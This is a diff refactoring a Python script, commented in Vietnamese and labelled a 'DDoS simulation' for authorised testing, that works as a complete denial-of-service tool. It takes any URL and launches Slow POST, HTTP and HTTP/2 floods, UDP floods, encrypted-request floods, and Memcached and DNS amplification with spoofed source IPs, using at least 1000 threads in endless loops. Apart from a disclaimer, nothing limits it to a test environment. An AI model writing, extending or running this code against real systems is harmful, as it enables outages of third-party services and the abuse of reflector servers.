@@ -1,3 +1,9 @@
+#!/usr/bin/env python3
+"""
+DDoS Simulation Script (Chỉ dùng cho mục đích kiểm thử trong môi trường được phép)
+Cải tiến: Cấu trúc code rõ ràng, tối ưu quản lý các luồng, báo cáo thống kê và handle lỗi.
+"""
+
 import importlib
 import subprocess
 import sys
@@ -15,7 +21,9 @@ from datetime import datetime
 from urllib.parse import urlparse
 from concurrent.futures import ThreadPoolExecutor
 
-# Module tự động cài đặt thư viện thiếu
+# ------------------------------
+# Cài đặt các thư viện cần thiết
+# ------------------------------
 def install_package(package):
     try:
         importlib.import_module(package)
@@ -29,20 +37,27 @@ def install_package(package):
             logging.error(f"Failed to install {package}: {e}")
             sys.exit(1)
 
-# Kiểm tra và cài đặt các thư viện cần thiết
 required_packages = ["requests", "scapy", "h2"]
-for package in required_packages:
-    install_package(package)
+for pkg in required_packages:
+    install_package(pkg)
 
-# Nhập các module sau khi đảm bảo đã cài đặt
-from scapy.all import *
+# Nhập module sau khi cài đặt
+from scapy.all import send, IP, UDP, Raw, DNS, DNSQR  
 import http.client
 import ssl
 
-# Cấu hình logging
-logging.basicConfig(filename='ddos_simulation.log', level=logging.INFO,
-                    format='%(asctime)s - %(levelname)s - %(message)s')
+# ------------------------------
+# Cấu hình Logging
+# ------------------------------
+logging.basicConfig(
+    filename='ddos_simulation.log',
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
 
+# ------------------------------
+# Cấu hình danh sách User-Agent và Accept Headers
+# ------------------------------
 # Danh sách 200 User-Agent
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -597,85 +612,79 @@ ACCEPT_HEADERS = [
     "application/x-awk"
     ]
 
-# Module thống kê
+
+# ------------------------------
+# Các hàm hỗ trợ
+# ------------------------------
 stats = defaultdict(int)
 stats_lock = threading.Lock()
 
-# Hàm xác thực URL
 def is_valid_url(url):
+    """Xác thực cấu trúc URL."""
     try:
         result = urlparse(url)
         return all([result.scheme in ["http", "https"], result.netloc])
     except ValueError:
         return False
 
-# Hàm phân giải IP từ hostname
 def resolve_ip(host):
+    """Phân giải IP từ hostname."""
     try:
         return socket.gethostbyname(host)
     except socket.gaierror:
         logging.error(f"Failed to resolve IP for {host}")
         return None
 
-# Hàm xác thực số luồng
 def is_valid_threads(num_threads):
+    """Xác thực số luồng phải >= 1000."""
     try:
-        num_threads = int(num_threads)
-        return num_threads >= 1000
+        return int(num_threads) >= 1000
     except ValueError:
         return False
 
-# Hàm kiểm tra kết nối đến máy chủ
 def check_server(ip, port, timeout=5):
+    """Kiểm tra kết nối TCP tới máy chủ."""
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(timeout)
-        result = sock.connect_ex((ip, port))
-        sock.close()
-        return result == 0
+        with socket.create_connection((ip, port), timeout=timeout) as sock:
+            return True
     except Exception as e:
         logging.error(f"Server check failed for {ip}:{port}: {e}")
         return False
 
-# Module nhập cấu hình mục tiêu
 def input_targets():
+    """Nhập cấu hình mục tiêu và tự động thêm mục tiêu Memcached, DNS."""
     targets = {
-        "web_targets": [],  # Danh sách {url, ip, port}
-        "memcached_targets": [],  # Danh sách {ip, port}
-        "dns_targets": []  # Danh sách {ip, port}
+        "web_targets": [],
+        "memcached_targets": [],
+        "dns_targets": []
     }
-    
-    # Nhập một URL duy nhất
     while True:
         url = input("Nhập URL mục tiêu web (http:// hoặc https://): ").strip()
         if not is_valid_url(url):
             print("URL không hợp lệ, thử lại.")
             continue
-        parsed_url = urlparse(url)
-        host = parsed_url.hostname
+        parsed = urlparse(url)
+        host = parsed.hostname
         ip = resolve_ip(host)
         if not ip:
             print(f"Không thể phân giải IP từ {host}, thử lại.")
             continue
-        port = 443 if parsed_url.scheme == "https" else 80
-        # Kiểm tra máy chủ
+        port = 443 if parsed.scheme == "https" else 80
         if not check_server(ip, port):
-            print(f"Không thể kết nối đến {ip}:{port}. Đảm bảo máy chủ giả lập đang chạy.")
+            print(f"Không thể kết nối đến {ip}:{port}. Đảm bảo máy chủ đang hoạt động.")
             continue
         targets["web_targets"].append({"url": url, "ip": ip, "port": port})
         print(f"Đã nhận diện: URL={url}, IP={ip}, Port={port}")
         break
-    
-    # Tự động tạo mục tiêu Memcached và DNS
+    # Tạo mục tiêu Memcached và DNS dựa trên IP web
     ip = targets["web_targets"][0]["ip"]
     targets["memcached_targets"].append({"ip": ip, "port": 11211})
     targets["dns_targets"].append({"ip": ip, "port": 53})
     print(f"Đã tự động thêm: Memcached IP={ip}, Port=11211; DNS IP={ip}, Port=53")
-    
     return targets
 
-# Module tự động: Tạo tiêu đề ngẫu nhiên
 def generate_headers():
+    """Sinh tiêu đề HTTP ngẫu nhiên."""
     return {
         "User-Agent": random.choice(USER_AGENTS),
         "Accept": random.choice(ACCEPT_HEADERS),
@@ -688,280 +697,236 @@ def generate_headers():
         "Connection": "keep-alive"
     }
 
-# Module tự động: Tạo payload ngẫu nhiên
+def random_string(length):
+    """Sinh chuỗi ngẫu nhiên gồm chữ và số."""
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
+
 def generate_payload(size=1000):
+    """Sinh payload dạng form, json hay xml ngẫu nhiên."""
     payload_type = random.choice(["form", "json", "xml"])
     if payload_type == "form":
         return {"data": ''.join(random.choice(string.ascii_letters) for _ in range(size))}
     elif payload_type == "json":
         return {"data": random_string(size), "id": random.randint(1, 10000)}
-    else:  # xml
+    else:
         return f"<data>{random_string(size)}</data>"
 
-# Hàm tạo chuỗi ngẫu nhiên
-def random_string(length):
-    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
-
-# Hàm tấn công Slow POST thực tế
+# ------------------------------
+# Các hàm tấn công (Simulation)
+# Các hàm dưới đây sử dụng các kỹ thuật DDoS mô phỏng
+# (Chỉ dùng trong môi trường được phép)
+# ------------------------------
 def slow_post(targets):
-    try:
-        web_targets = targets["web_targets"]
-        if not web_targets:
-            return
-        def send_slow_post(target):
-            headers = generate_headers()
-            headers["Content-Length"] = str(10000)
-            session = requests.Session()
-            req = session.prepare_request(requests.Request('POST', target["url"], headers=headers, data="").prepare())
-            logging.info(f"Sending Slow POST to {target['url']}")
-            try:
-                conn = session.send(req, stream=True, timeout=15)
-                for i in range(5):  # Giảm số chunk
-                    chunk = random_string(1000).encode()
-                    conn.send(chunk)
-                    logging.info(f"Sent chunk {i+1} for Slow POST to {target['url']}")
-                    with stats_lock:
-                        stats["slow_post_requests"] += 1
-                    time.sleep(1)
-                conn.close()
-            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
-                logging.warning(f"Slow POST temporary error to {target['url']}: {e}")
-            except Exception as e:
-                logging.error(f"Slow POST critical error to {target['url']}: {e}")
+    web_targets = targets["web_targets"]
+    if not web_targets:
+        return
+    def send_slow_post(target):
+        headers = generate_headers()
+        headers["Content-Length"] = "10000"
+        session = requests.Session()
+        req = requests.Request(
+            'POST', target["url"],
+            headers=headers,
+            data=""
+        )
+        prepped = session.prepare_request(req)
+        logging.info(f"Sending Slow POST to {target['url']}")
+        try:
+            conn = session.send(prepped, stream=True, timeout=15)
+            for i in range(5):  # Giảm số chunk gửi đi
+                chunk = random_string(1000).encode()
+                conn.send(chunk)
+                logging.info(f"Sent chunk {i+1} for Slow POST to {target['url']}")
                 with stats_lock:
-                    stats["errors"] += 1
-        
-        while True:
-            target = random.choice(web_targets)
-            with ThreadPoolExecutor(max_workers=50) as executor:
-                executor.submit(send_slow_post, target)
-            time.sleep(0.2)  # Tăng thời gian chờ
-    except KeyboardInterrupt:
-        logging.info("Slow POST stopped by user")
-    except Exception as e:
-        logging.error(f"Slow POST error: {e}")
-        with stats_lock:
-            stats["errors"] += 1
+                    stats["slow_post_requests"] += 1
+                time.sleep(1)
+            conn.close()
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
+            logging.warning(f"Slow POST temporary error to {target['url']}: {e}")
+        except Exception as e:
+            logging.error(f"Slow POST critical error to {target['url']}: {e}")
+            with stats_lock:
+                stats["errors"] += 1
 
-# Hàm tấn công HTTP Flood thực tế
+    while True:
+        target = random.choice(web_targets)
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            executor.submit(send_slow_post, target)
+        time.sleep(0.2)
+
 def http_flood(targets):
-    try:
-        web_targets = targets["web_targets"]
-        if not web_targets:
-            return
-        def send_http_request(target):
-            headers = generate_headers()
-            payload = generate_payload(500)
-            params = {f"q{random.randint(1,1000)}": random_string(50)}
-            try:
-                response = requests.get(target["url"], headers=headers, params=params, timeout=15)
-                logging.info(f"HTTP Flood sent to {target['url']}: {response.status_code}")
-                with stats_lock:
-                    stats["http_flood_requests"] += 1
-            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
-                logging.warning(f"HTTP Flood temporary error to {target['url']}: {e}")
-            except Exception as e:
-                logging.error(f"HTTP Flood critical error to {target['url']}: {e}")
-                with stats_lock:
-                    stats["errors"] += 1
-        
-        while True:
-            target = random.choice(web_targets)
-            with ThreadPoolExecutor(max_workers=50) as executor:
-                for _ in range(10):  # Giảm số yêu cầu
-                    executor.submit(send_http_request, target)
-            time.sleep(0.2)  # Tăng thời gian chờ
-    except KeyboardInterrupt:
-        logging.info("HTTP Flood stopped by user")
-    except Exception as e:
-        logging.error(f"HTTP Flood error: {e}")
-        with stats_lock:
-            stats["errors"] += 1
+    web_targets = targets["web_targets"]
+    if not web_targets:
+        return
+    def send_http_request(target):
+        headers = generate_headers()
+        params = {f"q{random.randint(1,1000)}": random_string(50)}
+        try:
+            response = requests.get(target["url"], headers=headers, params=params, timeout=15)
+            logging.info(f"HTTP Flood sent to {target['url']}: {response.status_code}")
+            with stats_lock:
+                stats["http_flood_requests"] += 1
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
+            logging.warning(f"HTTP Flood temporary error to {target['url']}: {e}")
+        except Exception as e:
+            logging.error(f"HTTP Flood critical error to {target['url']}: {e}")
+            with stats_lock:
+                stats["errors"] += 1
 
-# Hàm tấn công HTTP/2 Flood thực tế
+    while True:
+        target = random.choice(web_targets)
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            for _ in range(10):
+                executor.submit(send_http_request, target)
+        time.sleep(0.2)
+
 def http2_flood(targets):
-    try:
-        web_targets = targets["web_targets"]
-        if not web_targets:
-            return
-        def send_http2_request(target):
-            context = ssl._create_unverified_context()
-            conn = http.client.HTTPSConnection(target["ip"], target["port"], context=context, timeout=15)
-            headers = generate_headers()
-            headers.update({
-                ":method": "GET",
-                ":path": f"/?q={random_string(10)}",
-                ":scheme": "https",
-                ":authority": target["ip"]
-            })
-            try:
-                for _ in range(25):  # Giảm số yêu cầu
-                    conn.request("GET", f"/?q={random_string(10)}", headers=headers)
-                    response = conn.getresponse()
-                    response.read()
-                logging.info(f"HTTP/2 Flood sent to {target['ip']}:{target['port']}")
-                with stats_lock:
-                    stats["http2_flood_requests"] += 25
-            except (http.client.HTTPException, TimeoutError) as e:
-                logging.warning(f"HTTP/2 Flood temporary error to {target['ip']}:{target['port']}: {e}")
-            except Exception as e:
-                logging.error(f"HTTP/2 Flood critical error to {target['ip']}:{target['port']}: {e}")
-                with stats_lock:
-                    stats["errors"] += 1
-            finally:
-                conn.close()
-        
-        while True:
-            target = random.choice(web_targets)
-            with ThreadPoolExecutor(max_workers=50) as executor:
-                executor.submit(send_http2_request, target)
-            time.sleep(0.2)  # Tăng thời gian chờ
-    except KeyboardInterrupt:
-        logging.info("HTTP/2 Flood stopped by user")
-    except Exception as e:
-        logging.error(f"HTTP/2 Flood error: {e}")
-        with stats_lock:
-            stats["errors"] += 1
+    web_targets = targets["web_targets"]
+    if not web_targets:
+        return
+    def send_http2_request(target):
+        context = ssl._create_unverified_context()
+        conn = http.client.HTTPSConnection(target["ip"], target["port"], context=context, timeout=15)
+        headers = generate_headers()
+        headers.update({
+            ":method": "GET",
+            ":path": f"/?q={random_string(10)}",
+            ":scheme": "https",
+            ":authority": target["ip"]
+        })
+        try:
+            for _ in range(25):
+                conn.request("GET", f"/?q={random_string(10)}", headers=headers)
+                response = conn.getresponse()
+                response.read()
+            logging.info(f"HTTP/2 Flood sent to {target['ip']}:{target['port']}")
+            with stats_lock:
+                stats["http2_flood_requests"] += 25
+        except (http.client.HTTPException, TimeoutError) as e:
+            logging.warning(f"HTTP/2 Flood temporary error to {target['ip']}:{target['port']}: {e}")
+        except Exception as e:
+            logging.error(f"HTTP/2 Flood critical error to {target['ip']}:{target['port']}: {e}")
+            with stats_lock:
+                stats["errors"] += 1
+        finally:
+            conn.close()
 
-# Hàm tấn công UDP Flood thực tế
+    while True:
+        target = random.choice(web_targets)
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            executor.submit(send_http2_request, target)
+        time.sleep(0.2)
+
 def udp_flood(targets):
-    try:
-        web_targets = targets["web_targets"]
-        if not web_targets:
-            return
-        while True:
-            target = random.choice(web_targets)
-            packet = IP(dst=target["ip"])/UDP(dport=random.randint(1, 65535))/Raw(load=random_string(1400))
-            try:
-                send(packet, verbose=False, count=5)  # Giảm số gói
-                logging.info(f"UDP Flood packets sent to {target['ip']}:{random.randint(1, 65535)}")
-                with stats_lock:
-                    stats["udp_flood_packets"] += 5
-            except Exception as e:
-                logging.error(f"UDP Flood error to {target['ip']}: {e}")
-                with stats_lock:
-                    stats["errors"] += 1
-            time.sleep(0.2)  # Tăng thời gian chờ
-    except KeyboardInterrupt:
-        logging.info("UDP Flood stopped by user")
-    except Exception as e:
-        logging.error(f"UDP Flood error: {e}")
-        with stats_lock:
-            stats["errors"] += 1
+    web_targets = targets["web_targets"]
+    if not web_targets:
+        return
+    while True:
+        target = random.choice(web_targets)
+        packet = IP(dst=target["ip"]) / UDP(dport=random.randint(1, 65535)) / Raw(load=random_string(1400))
+        try:
+            send(packet, verbose=False, count=5)
+            logging.info(f"UDP Flood packets sent to {target['ip']}")
+            with stats_lock:
+                stats["udp_flood_packets"] += 5
+        except Exception as e:
+            logging.error(f"UDP Flood error to {target['ip']}: {e}")
+            with stats_lock:
+                stats["errors"] += 1
+        time.sleep(0.2)
 
-# Hàm tấn công Encrypted Requests thực tế
 def encrypted_request(targets):
-    try:
-        web_targets = targets["web_targets"]
-        if not web_targets:
-            return
-        def send_encrypted_request(target):
-            headers = generate_headers()
-            payload = generate_payload(2000)
-            try:
-                response = requests.post(f"https://{target['ip']}:{target['port']}",
-                                       headers=headers, json=payload, verify=False, timeout=15)
-                logging.info(f"Encrypted Request sent to {target['ip']}:{target['port']}: {response.status_code}")
-                with stats_lock:
-                    stats["encrypted_requests"] += 1
-            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
-                logging.warning(f"Encrypted Request temporary error to {target['ip']}:{target['port']}: {e}")
-            except Exception as e:
-                logging.error(f"Encrypted Request critical error to {target['ip']}:{target['port']}: {e}")
-                with stats_lock:
-                    stats["errors"] += 1
-        
-        while True:
-            target = random.choice(web_targets)
-            with ThreadPoolExecutor(max_workers=50) as executor:
-                for _ in range(8):  # Giảm số yêu cầu
-                    executor.submit(send_encrypted_request, target)
-            time.sleep(0.2)  # Tăng thời gian chờ
-    except KeyboardInterrupt:
-        logging.info("Encrypted Request stopped by user")
-    except Exception as e:
-        logging.error(f"Encrypted Request error: {e}")
-        with stats_lock:
-            stats["errors"] += 1
+    web_targets = targets["web_targets"]
+    if not web_targets:
+        return
+    def send_encrypted_request(target):
+        headers = generate_headers()
+        payload = generate_payload(2000)
+        try:
+            response = requests.post(
+                f"https://{target['ip']}:{target['port']}",
+                headers=headers, json=payload, verify=False, timeout=15
+            )
+            logging.info(f"Encrypted Request sent to {target['ip']}:{target['port']}: {response.status_code}")
+            with stats_lock:
+                stats["encrypted_requests"] += 1
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
+            logging.warning(f"Encrypted Request temporary error to {target['ip']}:{target['port']}: {e}")
+        except Exception as e:
+            logging.error(f"Encrypted Request critical error to {target['ip']}:{target['port']}: {e}")
+            with stats_lock:
+                stats["errors"] += 1
 
-# Hàm tấn công Memcached Amplification thực tế
+    while True:
+        target = random.choice(web_targets)
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            for _ in range(8):
+                executor.submit(send_encrypted_request, target)
+        time.sleep(0.2)
+
 def memcached_amplification(targets):
-    try:
-        memcached_targets = targets["memcached_targets"]
-        web_targets = targets["web_targets"]
-        if not memcached_targets or not web_targets:
-            return
-        # Kiểm tra Memcached server
-        memcached = memcached_targets[0]
-        if not check_server(memcached["ip"], memcached["port"]):
-            logging.warning(f"Memcached server not running at {memcached['ip']}:{memcached['port']}. Skipping Memcached Amplification.")
-            return
-        while True:
-            target = random.choice(web_targets)
-            memcached = random.choice(memcached_targets)
-            spoofed_ip = target["ip"] if random.random() < 0.8 else f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
-            packet = (IP(src=spoofed_ip, dst=memcached["ip"]) /
-                     UDP(sport=random.randint(1024, 65535), dport=memcached["port"]) /
-                     Raw(load="\x00\x00\x00\x00\x00\x01\x00\x00get " + random_string(20) + "\r\n"))
-            try:
-                send(packet, verbose=False, count=5)
-                logging.info(f"Memcached Amplification packets sent to {memcached['ip']}:{memcached['port']} spoofing {spoofed_ip}")
-                with stats_lock:
-                    stats["memcached_packets"] += 5
-            except Exception as e:
-                logging.error(f"Memcached Amplification error to {memcached['ip']}: {e}")
-                with stats_lock:
-                    stats["errors"] += 1
-            time.sleep(0.2)  # Tăng thời gian chờ
-    except KeyboardInterrupt:
-        logging.info("Memcached Amplification stopped by user")
-    except Exception as e:
-        logging.error(f"Memcached Amplification error: {e}")
-        with stats_lock:
-            stats["errors"] += 1
+    memcached_targets = targets["memcached_targets"]
+    web_targets = targets["web_targets"]
+    if not memcached_targets or not web_targets:
+        return
+    memcached = memcached_targets[0]
+    if not check_server(memcached["ip"], memcached["port"]):
+        logging.warning(f"Memcached server not running at {memcached['ip']}:{memcached['port']}. Skipping Memcached Amplification.")
+        return
+    while True:
+        target = random.choice(web_targets)
+        spoofed_ip = target["ip"] if random.random() < 0.8 else f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
+        packet = (IP(src=spoofed_ip, dst=memcached["ip"]) /
+                  UDP(sport=random.randint(1024, 65535), dport=memcached["port"]) /
+                  Raw(load="\x00\x00\x00\x00\x00\x01\x00\x00get " + random_string(20) + "\r\n"))
+        try:
+            send(packet, verbose=False, count=5)
+            logging.info(f"Memcached Amplification packets sent to {memcached['ip']}:{memcached['port']} spoofing {spoofed_ip}")
+            with stats_lock:
+                stats["memcached_packets"] += 5
+        except Exception as e:
+            logging.error(f"Memcached Amplification error to {memcached['ip']}: {e}")
+            with stats_lock:
+                stats["errors"] += 1
+        time.sleep(0.2)
 
-# Hàm tấn công DNS Amplification thực tế
 def dns_amplification(targets):
-    try:
-        dns_targets = targets["dns_targets"]
-        web_targets = targets["web_targets"]
-        if not dns_targets or not web_targets:
-            return
-        # Kiểm tra DNS server
-        dns = dns_targets[0]
-        if not check_server(dns["ip"], dns["port"]):
-            logging.warning(f"DNS server not running at {dns['ip']}:{dns['port']}. Skipping DNS Amplification.")
-            return
-        while True:
-            target = random.choice(web_targets)
-            dns = random.choice(dns_targets)
-            spoofed_ip = target["ip"] if random.random() < 0.8 else f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
-            packet = (IP(src=spoofed_ip, dst=dns["ip"]) /
-                     UDP(sport=random.randint(1024, 65535), dport=dns["port"]) /
-                     DNS(rd=1, qd=DNSQR(qname=f"{random_string(10)}.example.com", qtype="TXT")))
-            try:
-                send(packet, verbose=False, count=5)
-                logging.info(f"DNS Amplification packets sent to {dns['ip']}:{dns['port']} spoofing {spoofed_ip}")
-                with stats_lock:
-                    stats["dns_packets"] += 5
-            except Exception as e:
-                logging.error(f"DNS Amplification error to {dns['ip']}: {e}")
-                with stats_lock:
-                    stats["errors"] += 1
-            time.sleep(0.2)  # Tăng thời gian chờ
-    except KeyboardInterrupt:
-        logging.info("DNS Amplification stopped by user")
-    except Exception as e:
-        logging.error(f"DNS Amplification error: {e}")
-        with stats_lock:
-            stats["errors"] += 1
+    dns_targets = targets["dns_targets"]
+    web_targets = targets["web_targets"]
+    if not dns_targets or not web_targets:
+        return
+    dns = dns_targets[0]
+    if not check_server(dns["ip"], dns["port"]):
+        logging.warning(f"DNS server not running at {dns['ip']}:{dns['port']}. Skipping DNS Amplification.")
+        return
+    while True:
+        spoofed_ip = random.choice(web_targets)["ip"]
+        packet = (IP(src=spoofed_ip, dst=dns["ip"]) /
+                  UDP(sport=random.randint(1024, 65535), dport=dns["port"]) /
+                  DNS(rd=1, qd=DNSQR(qname=f"{random_string(10)}.example.com", qtype="TXT")))
+        try:
+            send(packet, verbose=False, count=5)
+            logging.info(f"DNS Amplification packets sent to {dns['ip']}:{dns['port']} spoofing {spoofed_ip}")
+            with stats_lock:
+                stats["dns_packets"] += 5
+        except Exception as e:
+            logging.error(f"DNS Amplification error to {dns['ip']}: {e}")
+            with stats_lock:
+                stats["errors"] += 1
+        time.sleep(0.2)
 
-# Module tự động: Báo cáo thống kê
+# ------------------------------
+# Báo cáo thống kê và quản lý luồng
+# ------------------------------
 def generate_report():
     with stats_lock:
         report = f"""
 DDoS Simulation Report - {datetime.now()}
-----------------------------------------
+
+
+----
+
+
 Slow POST Requests: {stats['slow_post_requests']}
 HTTP Flood Requests: {stats['http_flood_requests']}
 HTTP/2 Flood Requests: {stats['http2_flood_requests']}
@@ -970,17 +935,20 @@ Encrypted Requests: {stats['encrypted_requests']}
 Memcached Amplification Packets: {stats['memcached_packets']}
 DNS Amplification Packets: {stats['dns_packets']}
 Errors: {stats['errors']}
-----------------------------------------
+
+
+----
+
+
 """
         logging.info(report)
         with open('ddos_report.txt', 'w') as f:
             f.write(report)
 
-# Module tự động: Quản lý luồng
 def run_attack(attack_func, name, targets, num_threads):
     try:
-        max_workers = min(50, num_threads)  # Giảm max_workers
-        num_batches = max(1, num_threads // max_workers)  # Số đợt
+        max_workers = min(50, num_threads)
+        num_batches = max(1, num_threads // max_workers)
         for batch in range(num_batches):
             with ThreadPoolExecutor(max_workers=max_workers) as executor:
                 for _ in range(max_workers):
@@ -992,16 +960,16 @@ def run_attack(attack_func, name, targets, num_threads):
         with stats_lock:
             stats["errors"] += 1
 
+# ------------------------------
 # Hàm chính
+# ------------------------------
 def main():
-    print("Mô phỏng DDoS bắt đầu (vòng lặp vô hạn). Nhấn Ctrl+C để dừng. Chỉ sử dụng trong môi trường được phép!")
+    print("Mô phỏng DDoS bắt đầu (vòng lặp vô hạn). Nhấn Ctrl+C để dừng. (Chỉ dùng trong môi trường được phép)")
     print("CẢNH BÁO: Số luồng lớn (1000-200,000+) có thể làm quá tải hệ thống. Đảm bảo phần cứng đủ mạnh!")
     logging.info("Starting DDoS simulation")
-
-    # Nhập cấu hình mục tiêu
+    
     targets = input_targets()
     
-    # Nhập số luồng
     while True:
         num_threads = input("Nhập số luồng (tối thiểu 1000, không giới hạn tối đa): ").strip()
         if is_valid_threads(num_threads):
@@ -1009,7 +977,6 @@ def main():
             break
         print("Số luồng không hợp lệ, phải >= 1000. Thử lại.")
 
-    # Danh sách các kỹ thuật tấn công
     attacks = [
         (slow_post, "Slow POST"),
         (http_flood, "HTTP Flood"),
@@ -1020,17 +987,15 @@ def main():
         (dns_amplification, "DNS Amplification")
     ]
 
-    # Khởi động luồng tự động
     threads = []
     for attack_func, name in attacks:
         t = threading.Thread(target=run_attack, args=(attack_func, name, targets, num_threads))
         threads.append(t)
         t.start()
 
-    # Giữ chương trình chạy và xử lý ngắt
     try:
         while True:
-            time.sleep(1)  # Ghi báo cáo định kỳ
+            time.sleep(1)
             generate_report()
     except KeyboardInterrupt:
         print("Đang dừng mô phỏng...")
